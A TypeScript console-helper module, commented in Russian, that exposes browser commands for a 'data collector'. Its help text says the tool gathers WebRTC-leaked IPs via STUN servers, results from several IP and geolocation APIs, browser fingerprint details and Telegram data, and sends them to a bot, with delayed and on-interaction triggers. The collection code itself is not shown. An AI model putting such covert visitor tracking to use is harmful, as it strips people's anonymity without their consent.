/**
 * CONSOLE HELPER для Data Collector
 * 
 * Добавляет удобные команды в консоль браузера для управления сбором данных
 * Использование: откройте консоль (F12) и введите команду
 */

import { startDataCollection, collectDataOnly, collectBasicInfo } from './data-collector';
import { startLazyDataCollection, startDelayedDataCollection, startOnUserInteraction } from './lazy-data-collector';

// Добавляем глобальные команды в window
declare global {
  interface Window {
    // Data Collector команды
    collectFull: () => Promise<any>;
    collectOnly: () => Promise<any>;
    collectBasic: () => any;
    collectLazy: () => Promise<any>;
    collectDelayed: (ms?: number) => void;
    collectOnInteraction: () => void;
    
    // Справка
    dataCollectorHelp: () => void;
  }
}

// 🚀 ПОЛНЫЙ сбор с отправкой в бота
window.collectFull = async () => {
  console.log('🚀 Запуск ПОЛНОГО сбора данных...');
  return await startDataCollection();
};

// 📊 Сбор БЕЗ отправки в бота
window.collectOnly = async () => {
  console.log('📊 Запуск сбора БЕЗ отправки...');
  return await collectDataOnly();
};

// ⚡ Только базовая информация
window.collectBasic = () => {
  console.log('⚡ Сбор базовой информации...');
  return collectBasicInfo();
};

// 💤 Ленивая загрузка
window.collectLazy = async () => {
  console.log('💤 Ленивая загрузка модуля...');
  return await startLazyDataCollection();
};

// ⏱️ Отложенный запуск
window.collectDelayed = (ms = 1000) => {
  console.log(`⏱️ Отложенный запуск через ${ms}ms...`);
  startDelayedDataCollection(ms);
};

// 👆 По взаимодействию
window.collectOnInteraction = () => {
  console.log('👆 Ожидание взаимодействия пользователя...');
  startOnUserInteraction();
};

// 📖 Справка
window.dataCollectorHelp = () => {
  console.log(`
╔════════════════════════════════════════════════════════════════╗
║                   📦 DATA COLLECTOR COMMANDS                   ║
╠════════════════════════════════════════════════════════════════╣
║                                                                ║
║  🚀 ОСНОВНЫЕ КОМАНДЫ:                                          ║
║                                                                ║
║  collectFull()              - Полный сбор + отправка в бота   ║
║  collectOnly()              - Только сбор (без отправки)      ║
║  collectBasic()             - Базовая информация (быстро)     ║
║                                                                ║
║  💤 ЛЕНИВЫЕ КОМАНДЫ:                                           ║
║                                                                ║
║  collectLazy()              - Ленивая загрузка модуля         ║
║  collectDelayed(1000)       - Отложенный на 1 сек             ║
║  collectOnInteraction()     - По клику/скроллу                ║
║                                                                ║
║  📖 СПРАВКА:                                                   ║
║                                                                ║
║  dataCollectorHelp()        - Показать эту справку            ║
║                                                                ║
╠════════════════════════════════════════════════════════════════╣
║                                                                ║
║  📊 ПРИМЕРЫ:                                                   ║
║                                                                ║
║  > collectFull()                                               ║
║    // Собирает все данные и отправляет в бота                 ║
║                                                                ║
║  > collectBasic()                                              ║
║    // Возвращает базовую информацию (быстро)                  ║
║                                                                ║
║  > collectDelayed(2000)                                        ║
║    // Запустит сбор через 2 секунды                           ║
║                                                                ║
╠════════════════════════════════════════════════════════════════╣
║                                                                ║
║  ⚡ ЧТО СОБИРАЕТСЯ:                                            ║
║                                                                ║
║  • WebRTC IP (множественные STUN серверы)                     ║
║  • 9 IP API (параллельно)                                     ║
║  • 4 Geo API (параллельно)                                    ║
║  • User Agent, браузер, ОС, язык                              ║
║  • Разрешение экрана, часовой пояс                            ║
║  • Telegram данные (если доступны)                            ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
  `);
};

// Показываем подсказку при загрузке
console.log('💡 Data Collector загружен! Введите dataCollectorHelp() для справки');

export {};
